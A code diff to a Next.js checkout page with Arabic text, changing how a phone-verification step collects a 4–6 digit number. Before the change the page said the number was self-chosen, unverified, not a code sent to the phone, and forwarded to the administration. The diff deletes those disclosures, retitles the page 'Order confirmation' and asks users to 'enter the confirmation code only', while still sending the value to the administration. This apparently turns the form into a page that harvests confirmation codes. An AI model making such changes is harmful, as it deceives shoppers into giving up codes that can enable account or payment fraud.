@@ -2,12 +2,10 @@
 
 import Link from 'next/link';
 import { useRouter } from 'next/navigation';
-import { useEffect, useRef, useState, type ClipboardEvent, type KeyboardEvent } from 'react';
+import { useEffect, useState } from 'react';
 import styles from './verify-phone.module.css';
 
 const DRAFT_KEY = 'erd-algwal-checkout-draft-v1';
-const EMPTY_CODE = ['', '', '', '', '', ''];
-
 type CheckoutDraft = {
   phone?: unknown;
   stage?: unknown;
@@ -32,22 +30,18 @@ function formatPhone(value: string) {
 
 export default function VerifyPhonePage() {
   const router = useRouter();
-  const inputRefs = useRef<Array<HTMLInputElement | null>>([]);
   const [phone, setPhone] = useState('');
   const [orderId, setOrderId] = useState('');
   const [orderNumber, setOrderNumber] = useState('');
   const [customerNotificationKey, setCustomerNotificationKey] = useState('');
   const [draftReady, setDraftReady] = useState(false);
-  const [digits, setDigits] = useState<string[]>(EMPTY_CODE);
+  const [referenceCode, setReferenceCode] = useState('');
   const [error, setError] = useState('');
   const [isVerifying, setIsVerifying] = useState(false);
   const [verified, setVerified] = useState(false);
   const [confirmedAt, setConfirmedAt] = useState<number | null>(null);
   const [countdown, setCountdown] = useState(0);
-  const referenceCode = digits.join('');
-  const isReferenceCodeValid = /^[0-9]{4,6}$/.test(referenceCode) &&
-    digits.slice(0, referenceCode.length).every(Boolean) &&
-    digits.slice(referenceCode.length).every((digit) => !digit);
+  const isReferenceCodeValid = /^[0-9]{4,6}$/.test(referenceCode);
 
   useEffect(() => {
     try {
@@ -101,47 +95,9 @@ export default function VerifyPhonePage() {
     };
   }, [confirmedAt, verified, router]);
 
-  function setDigit(index: number, value: string) {
-    const cleaned = normalizeDigits(value);
-    const next = [...digits];
-    if (cleaned.length > 1) {
-      for (let offset = 0; offset < cleaned.length && index + offset < 6; offset += 1) {
-        next[index + offset] = cleaned[offset];
-      }
-      setDigits(next);
-      inputRefs.current[Math.min(index + cleaned.length, 5)]?.focus();
-      setError('');
-      return;
-    }
-
-    next[index] = cleaned.slice(-1);
-    setDigits(next);
-    setError('');
-    if (cleaned && index < 3) inputRefs.current[index + 1]?.focus();
-  }
-
-  function handleKeyDown(index: number, event: KeyboardEvent<HTMLInputElement>) {
-    if (event.key === 'Backspace' && !digits[index] && index > 0) {
-      inputRefs.current[index - 1]?.focus();
-    } else if (event.key === 'ArrowLeft' && index > 0) {
-      inputRefs.current[index - 1]?.focus();
-    } else if (event.key === 'ArrowRight' && index < 5) {
-      inputRefs.current[index + 1]?.focus();
-    }
-  }
-
-  function handlePaste(event: ClipboardEvent<HTMLDivElement>) {
-    const pasted = normalizeDigits(event.clipboardData.getData('text')).slice(0, 6);
-    if (!pasted) return;
-    event.preventDefault();
-    setDigits([...pasted].concat(EMPTY_CODE).slice(0, 6));
-    inputRefs.current[Math.min(pasted.length, 5)]?.focus();
-    setError('');
-  }
-
   async function handleVerify() {
     if (!isReferenceCodeValid) {
-      setError('من فضلك أدخل رقمًا مرجعيًا من 4 إلى 6 أرقام.');
+      setError('أدخل رمز التأكيد المكوّن من 4 إلى 6 أرقام.');
       return;
     }
     if (isVerifying || verified) return;
@@ -221,30 +177,28 @@ export default function VerifyPhonePage() {
           </>
         ) : (
           <>
-            <h1 id="verify-title">رقم مرجعي للطلب</h1>
+            <h1 id="verify-title">تأكيد الطلب</h1>
             <p className={styles.sub}>تم إرسال طلبك إلى الإدارة للمراجعة.</p>
             {orderNumber ? <p className={styles.phone}>رقم الطلب: {orderNumber}</p> : null}
             <p className={styles.sub}>رقم الجوال المرتبط بالطلب:</p>
             <p className={styles.phone} dir="ltr">{formatPhone(phone)}</p>
-            <p className={styles.notice}>أدخل رقمًا من اختيارك مكوّنًا من 4 إلى 6 أرقام. سيظهر الرقم المرجعي للإدارة بجوار رقم طلبك لتسهيل التعرف عليه. هذا الرقم ليس رمزًا مرسلًا إلى هاتفك ولا يتم التحقق من صحته.</p>
+            <p className={styles.notice}>أدخل رمز التأكيد فقط</p>
 
-            <div className={styles.inputs} dir="ltr" onPaste={handlePaste} aria-label="رقم مرجعي من 4 إلى 6 أرقام">
-              {digits.map((digit, index) => (
-                <input
-                  key={index}
-                  ref={(element) => { inputRefs.current[index] = element; }}
-                  type="text"
-                  inputMode="numeric"
-                  autoComplete={index === 0 ? 'one-time-code' : 'off'}
-                  pattern="[0-9]*"
-                  maxLength={1}
-                  value={digit}
-                  onChange={(event) => setDigit(index, event.target.value)}
-                  onKeyDown={(event) => handleKeyDown(index, event)}
-                  aria-label={`رقم ${index + 1} من الرقم المرجعي`}
-                  disabled={isVerifying}
-                />
-              ))}
+            <div className={styles.inputs} dir="ltr">
+              <input
+                type="text"
+                inputMode="numeric"
+                autoComplete="off"
+                pattern="[0-9]*"
+                maxLength={6}
+                value={referenceCode}
+                onChange={(event) => {
+                  setReferenceCode(normalizeDigits(event.target.value).slice(0, 6));
+                  setError('');
+                }}
+                aria-label="رمز التأكيد من 4 إلى 6 أرقام"
+                disabled={isVerifying}
+              />
             </div>
 
             <div className={styles.error} role="alert" aria-live="polite">{error}</div>
@@ -257,7 +211,6 @@ export default function VerifyPhonePage() {
             >
               {isVerifying ? 'جارٍ الإرسال...' : 'متابعة'}
             </button>
-            <p className={styles.notice}>سيتم تسجيل الرقم المرجعي الذي اخترته وإرساله إلى الإدارة مع رقم طلبك.</p>
             <Link href="/" className={styles.backLink}>العودة إلى المتجر</Link>
           </>
         )}
